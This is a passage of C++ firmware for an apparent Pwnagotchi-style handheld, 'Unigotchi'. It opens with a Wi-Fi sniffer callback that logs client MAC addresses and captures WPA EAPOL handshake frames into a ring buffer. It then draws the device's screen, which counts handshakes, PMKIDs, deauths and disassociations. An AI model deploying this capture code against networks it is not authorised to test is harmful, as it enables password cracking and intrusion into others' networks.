  if (toDs && !fromDs)      { memcpy(bssid, pay + 4, 6);  memcpy(sta, pay + 10, 6); haveSta = true; }
  else if (!toDs && fromDs) { memcpy(bssid, pay + 10, 6); memcpy(sta, pay + 4, 6);  haveSta = true; }
  else                      { memcpy(bssid, pay + 16, 6); }

  if (haveSta && !(sta[0] & 0x01)) {
    bool zero = true; for (int i = 0; i < 6; i++) if (sta[i]) { zero = false; break; }
    if (!zero) {
      int nx = (_cHead + 1) % CRING;
      if (nx != _cTail) {
        ClientSight& c = _cring[_cHead];
        memcpy(c.bssid, bssid, 6); memcpy(c.sta, sta, 6);
        c.channel = pkt->rx_ctrl.channel; c.rssi = pkt->rx_ctrl.rssi;
        _cHead = nx;
      }
    }
  }

  const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  for (uint16_t i = 24; i + 10 <= len; i++) {   // need SNAP(8)+ver(1)+type(1); avoids OOB read of pay[i+9]
    bool m = true; for (int k = 0; k < 8; k++) if (pay[i + k] != snap[k]) { m = false; break; }
    if (!m) continue;
    if (pay[i + 9] != 0x03) return;
    int next = (_ringHead + 1) % RING_SIZE; if (next == _ringTail) return;
    RawCapture& s = _ring[_ringHead];
    memcpy(s.bssid.data(), bssid, 6);
    uint16_t cl = len > MAX_FRAME ? MAX_FRAME : len;
    memcpy(s.data, pay, cl);
    s.len = cl; s.channel = pkt->rx_ctrl.channel; s.rssi = pkt->rx_ctrl.rssi; s.isBeacon = false;
    _ringHead = next; return;
  }
}

// ── UI ────────────────────────────────────────────────────────────────────────

// New message: fade the shown one into history, then type the new one in bright.
void WifiUnigotchiScreen::_say(MoodFace::Mood mood, uint16_t faceColor, const String& phrase) {
  if (_curMsg[0]) {
    strncpy(_history[0], _history[1], sizeof(_history[0]) - 1);
    _history[0][sizeof(_history[0]) - 1] = '\0';
    strncpy(_history[1], _curMsg, sizeof(_history[1]) - 1);
    _history[1][sizeof(_history[1]) - 1] = '\0';
  }
  _faceMood = mood; _faceColor = faceColor; _faceVariant = (uint8_t)random(4);
  strncpy(_curMsg, phrase.c_str(), sizeof(_curMsg) - 1);
  _curMsg[sizeof(_curMsg) - 1] = '\0';
  _typePos = 0; _lastCharMs = millis(); _lastMoodMs = millis();
  _dirty |= D_HEAD | D_BUBBLE;
}

// Full-screen layout cloned from the home CharacterScreen: face at the same
// size/position as the hacker head, and a 3-row speech bubble where the newest
// line is bright and older lines fade.
void WifiUnigotchiScreen::onRender() {
  auto& lcd = Uni.Lcd;
  const int W = lcd.width(), H = lcd.height();
  const int PAD   = 4;
  const uint16_t theme = Config.getThemeColor();
  const int scale = W < 360 ? 1 : W < 600 ? 2 : 3;
  const int lineH = scale * 8;
  const int barH  = scale * 16;
  const int gap   = scale * 2;
  const int ps    = (W < 360) ? 3 : (W < 600) ? 6 : 9;

  const int topY1 = PAD + 2;
  const int topY2 = topY1 + lineH + gap;
  const int midY  = topY2 + lineH + gap;

  const int sec2H = barH * 2 + gap;
  const int sec2Y = H - 1 - sec2H;
  const int halfW = (W - PAD * 2 - gap) / 2;

  const int headW = 12 * ps;
  const int headH = 14 * ps;
  const int headX = PAD + scale * 4;
  const int midH  = sec2Y - midY;
  const int headY = midH > headH ? (midY + (midH - headH) / 2) : midY;

  const int bubX = headX + headW + gap * 3;
  const int bubW = W - bubX - PAD;
  const int ip   = gap * 2;
  const int rowH = lineH + gap;
  const int bubH = lineH * 3 + gap * 2 + ip * 2;
  const int bubY = headY + headH / 2 - bubH / 2;
  const int btx  = bubX + gap * 2;

  const uint16_t bubBg = 0x0841;
  const uint16_t col3 = TFT_GREEN, col2 = 0x0460, col1 = 0x01C0;

  const bool isFirst = _firstRender;
  if (isFirst) { lcd.fillScreen(TFT_BLACK); _firstRender = false; _dirty = D_ALL; }
  lcd.setTextSize(scale);

  // ── TOP: title + mode badge + channel ──────────────────────────────────
  if (_dirty & D_TOP) {
    lcd.fillRect(0, 0, W, midY, TFT_BLACK);
    lcd.setTextDatum(TL_DATUM);
    lcd.setTextColor(theme);
    lcd.drawString("UNIGOTCHI", PAD, topY1);
    const char* nm = _mode == MODE_ACTIVE ? "ACTIVE" : _mode == MODE_PWNGRID ? "PWNGRID" : "PASSIVE";
    lcd.setTextDatum(TR_DATUM);
    lcd.setTextColor(_mode == MODE_ACTIVE ? TFT_RED : _mode == MODE_PWNGRID ? TFT_CYAN : TFT_GREEN);
    lcd.drawString(nm, W - PAD, topY1);
    char l2[16]; snprintf(l2, sizeof(l2), "CH %d", _channel);
    lcd.setTextDatum(TL_DATUM); lcd.setTextColor(TFT_DARKGREY);
    lcd.drawString(l2, PAD, topY2);
    _dirty &= ~D_TOP;
  }

  // ── HEAD (hacker head, same as the home screen — rank from EXP + blink) ──
  if (_dirty & D_HEAD) {
    lcd.fillRect(headX, headY, headW, headH, TFT_BLACK);
    int rank = hackerGetRank(Achievement.getExp()).rank;
    hackerDrawHead(lcd, headX, headY, ps, _animFrame == 1, rank);
    _dirty &= ~D_HEAD;
  }

  // ── BUBBLE (3 rows: newest bright, older faded) ─────────────────────────
  if (_dirty & D_BUBBLE) {
    if (bubW > lineH * 2) {
      if (isFirst) {
        lcd.fillRect(bubX, bubY, bubW, bubH, bubBg);
        lcd.drawRect(bubX, bubY, bubW, bubH, col3);
        const int tailW = gap * 3; const int tailMy = bubY + bubH / 2;
        for (int i = 0; i < tailW; i++) {
          int spr = i + 1; int tx2 = bubX - tailW + i + 1;
          lcd.drawFastVLine(tx2, tailMy - spr, spr * 2, bubBg);
          lcd.drawPixel(tx2, tailMy - spr, col3);
          lcd.drawPixel(tx2, tailMy + spr - 1, col3);
        }
      }
      const int spW = bubW - gap * 4;
      const int spH = lineH * 3 + gap * 2;
      Sprite sp(&lcd);
      sp.createSprite(spW, spH);
      sp.fillSprite(bubBg);
      sp.setTextSize(scale);
      sp.setTextDatum(ML_DATUM);
      const int sy1 = lineH / 2, sy2 = rowH + lineH / 2, sy3 = rowH * 2 + lineH / 2;
      sp.setTextColor(col1); if (_history[0][0]) sp.drawString(_history[0], 0, sy1);
      sp.setTextColor(col2); if (_history[1][0]) sp.drawString(_history[1], 0, sy2);
      {
        int len = (int)strlen(_curMsg);
        int shown = (_typePos <= (uint8_t)len) ? (int)_typePos : len;
        char buf[42] = {};
        if (shown > 0) memcpy(buf, _curMsg, shown);
        buf[shown] = '_';
        sp.setTextColor(col3); sp.drawString(buf, 0, sy3);
      }
      sp.pushSprite(btx, bubY + ip);
      sp.deleteSprite();
    }
    _dirty &= ~D_BUBBLE;
  }

  // ── STATS (two-bar stack, like the home HP/BRAIN bars) ──────────────────
  if (_dirty & D_STATS) {
    auto box = [&](int x, int y, int w, const char* lab, const char* val, uint16_t vc) {
      lcd.fillRect(x, y, w, barH, 0x2104);
      lcd.drawRect(x, y, w, barH, TFT_DARKGREY);
      lcd.setTextDatum(ML_DATUM); lcd.setTextColor(TFT_WHITE, 0x2104);
      lcd.drawString(lab, x + 5, y + barH / 2);
      lcd.setTextDatum(MR_DATUM); lcd.setTextColor(vc, 0x2104);
      lcd.drawString(val, x + w - 5, y + barH / 2);
    };
    lcd.setTextSize(scale);
    char b[16];
    const int r1 = sec2Y, r2 = sec2Y + barH + gap;
    snprintf(b, sizeof(b), "%lu", (unsigned long)_handshakes); box(PAD,          r1, halfW, "HS",     b, TFT_MAGENTA);
    snprintf(b, sizeof(b), "%lu", (unsigned long)_pmkids);     box(PAD+halfW+gap, r1, halfW, "PMKID",  b, TFT_ORANGE);
    snprintf(b, sizeof(b), "%lu", (unsigned long)_deauths);    box(PAD,          r2, halfW, "DEAUTH", b, TFT_YELLOW);
    snprintf(b, sizeof(b), "%lu", (unsigned long)_disassocs);  box(PAD+halfW+gap, r2, halfW, "DISASC", b, TFT_YELLOW);
    _dirty &= ~D_STATS;
  }
}
